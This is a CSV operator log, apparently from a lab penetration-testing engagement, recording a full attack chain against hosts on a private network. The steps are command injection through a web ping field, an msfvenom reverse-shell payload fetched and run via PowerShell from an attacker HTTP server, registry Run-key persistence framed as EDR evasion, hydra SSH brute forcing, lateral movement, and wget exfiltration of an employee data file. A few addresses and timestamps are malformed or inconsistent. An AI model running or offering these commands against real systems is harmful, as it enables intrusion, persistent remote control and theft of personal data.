Start,End,Source IP,Destination IP,Destination Port,Destination System,Pivot IP,Pivot Port,URL,Tool/App,Command,Description,Result,System Modification,Comments,Operator Name
20252907_154117,20252907_154120,192.168.110.106,192.168.110.0/24,N/A,NA,NA,NA,NA,nmap,nmap -sV 192.168.110.0/24,Complete a basic reconnisaince to get all the endpoints on the network and information about each endpoint.,Successful. ,NA,Noted http server on one device. Going to exploit that first,Mamadu Bah
20252907_154638,20252907_154640,192.168.110.106,192.168.110.103,N/A,Apache Web Server,N/A,N/A,192.168.110.103/proj,powershell,127.0.0.1; whoami /groups,Chaining whoami to the ping too input on the web server,Successful. ,NA,Was able to see web server uses an admin powershell. Also able to discover command injection to run commands to the web server host OS.,Mamadu Bah
20252907_160217,20252907_160220,192.168.110.106,N/A,N/A,N/A,N/A,N/A,N/A,msfvenom,"msfvenom -p windows/shell_reverse_tcp LHOST=10.10.0.5 LPORT=4444 -f exe -o cleaner.exe
",create a payload to drop onto the web server to establish the reverse shell,Successful. ,NA,,Mamadu Bah
20252907_160658,20252907_160705,192.168.110.106,N/A,N/A,N/A,N/A,N/A,N/A,http,python3 -m http.server 80,Create an HTTP server to drop the payload onto the web server,Successful. ,N/A,,Mamadu Bah
20252907_161438,20252907_161449,192.168.110.106,192.168.110.103,80,Apache Web Server,NA,NA,NA,powershell,"127.0.0.1; powershell -Command ""Invoke-WebRequest -Uri 'http://192.168.1100.106/cleaner.exe' -OutFile 'C:\Windows\Temp\cleaner.exe'""",Using HTTP to plant the reverse shell payload onto web server,Successful. ,N/A,,Mamadu Bah
20252907_162926,20252907_162942,192.168.110.106,192.168.110.103,80,Apache Web Server,NA,NA,NA,powershell,127.0.0.1; .\cleaner.exe,Runs the payload,Successful. ,N/A,Reverse Shell established,Mamadu Bah
20252907_171312,20252907_171310,192.168.110.106,N/A,N/A,,NA,NA,NA,netcat,nc -lnvp 4444,create a listener on kali,Successful. ,,Create a listener to attemp new reverse shell method that will have admin,Mamadu Bah
20252907_171922,20252907_171930,192.168.110.106,192.168.110.103,N/A,Apache Web Server,NA,NA,NA,powershell,"powershell -Command ""Invoke-WebRequest -Uri 'http://192.168.110.106/reverse.ps1' -OutFile './cleaner.ps1'; Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass -File ./cleaner.ps1'""",Drops and runs reverse shell powershell payload to establish reverse shell with admin,Successful. ,N/A,Admin session established,Mamadu Bah
20252907_172105,20252907_172112,192.168.110.103,,N/A,,NA,NA,NA,powershell,rm cleaner.ps1; rm cleaner.exe; rm reverse.bat,Remove all malicious files,Successful. ,,,Mamadu Bah
20252907_172711,20252907_172715,192.168.110.103,192.168.110.106,80,Kali HTTP Server,NA,NA,NA,powershell," powershell -Command ""Invoke-WebRequest -Uri 'http://192.168.110.106/client.pyw -OutFile './payload.pyw'""",HTTP to transfer C2 payload. Using pyw to avoid console from appearing on victime machine,Successful. ,,,Mamadu Bah
20252907_180706,20252907_180717,192.168.110.103,192.168.110.106,4440,Kali C2,NA,NA,NA,powershell,python3 payload.pyw,Runs the payload to connect to the C2 for persistent RCE,Successful. ,,,Mamadu Bah
20252907_180946,20252907_180952,192.168.110.106,192.168.110.103,4440,Apache Web Server,NA,NA,NA,powershell,python3 mainkali.py,Runs the main C2 server,Successful. ,,,Mamadu Bah
20252907_181327,20252907_181340,192.168.110.106,192.168.110.103,4440,Apache Web Server,NA,NA,NA,powershell,where python,Find location of Python's installation,Successful. ,,,Mamadu Bah
20252907_181720,20252907_181732,192.168.110.106,192.168.110.103,4440,Apache Web Server,NA,NA,NA,powershell,"New-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name ""PayloadSilent"" -Value '""C:\Users\X\AppData\Local\Programs\Python\Python313\pythonw.exe"" ""C:\Users\Public\payload.pyw""' -PropertyType String -Force",Adding pythonw.exe file along with the  payload.pyw to execute the payload every time the user logs in for persistence. This also evades the EDR system without the EDR deleting the payload,Successful. ,,Persistence with the victim machine is established. The payload runs every startup and the C2 is able to effectively communicate and execute commands to the victim machine poised for lateral movement. ,Mamadu Bah
20253007_231912,20253007_231915,192.168.110.103,192.168.110.101,4440,John's Machine,NA,NA,NA,powershell,"psexec \\192.168.110.101 -u ""boss\john"" -p password cmd /c hostname",Trying weak default credentials to use psexec that is installed on the web server device to login,Unsuccesful,,Executing commands through psexec is not working. Going to try to use ssh instead,Mamadu Bah
20253007_232634,20253007_232642,192.168.110.106,192.168.110.101,4440,John's Machine,NA,NA,NA,powershell,ssh boss@192.168.110.101,Ran an ssh through the C2 framework,Unsuccesful,,"Given the C2 is simply a raw TCP connection writing and returning written inputs and outputs, interactive sessions will fail. Going to try bruteforcing ssh through a seperate terminal",Mamadu Bah
20253007_232634,20253007_232642,192.168.110.106,192.168.110.101,22,John's Machine,NA,NA,NA,hydra,"hydra -l ""boss\john"" -P rockyou.txt ssh://192.168.110.101",Bruteforce potential weak SSH credentials,Successful. ,,,Mamadu Bah
20253007_233326,20253007_233331,192.168.110.106,192.168.110.101,22,John's Machine,NA,NA,NA,ssh,"ssh ""boss\john""@192.168.110.101",Establish a remote SSH connection with boss's endpoint.,Successful. ,,Machine 2 succesfully compromised,Mamadu Bah
20253007_234344,20253007_234352,192.168.110.101,192.168.110.106,80,Kali HTTP Server,NA,NA,NA,powershell," powershell -Command ""Invoke-WebRequest -Uri 'http://192.168.110.106/clientB.pyw -OutFile './payload.pyw'""",HTTP to transfer C2 payload onto new comrpomised machine. Using pyw to avoid console from appearing on victim machine.,Successful. ,Modified registry,C2 succesfully loaded onto newly compromised host. This allows for easier access without setting off any event logs through SSH,Mamadu Bah
20253007_235922,20253007_000004,192.168.110.106,192.168.110.101,8080,John's Machine,NA,NA,NA,wget,wget http://192.168.110.101/employee_info.csv,After finding the employee info csv file we create an http server to complete a file transfer between the kali machine and the compromised device. ,Successful. ,,We have succesfully exfiltrated the data of the employee ending the engagment.,Mamadu Bah
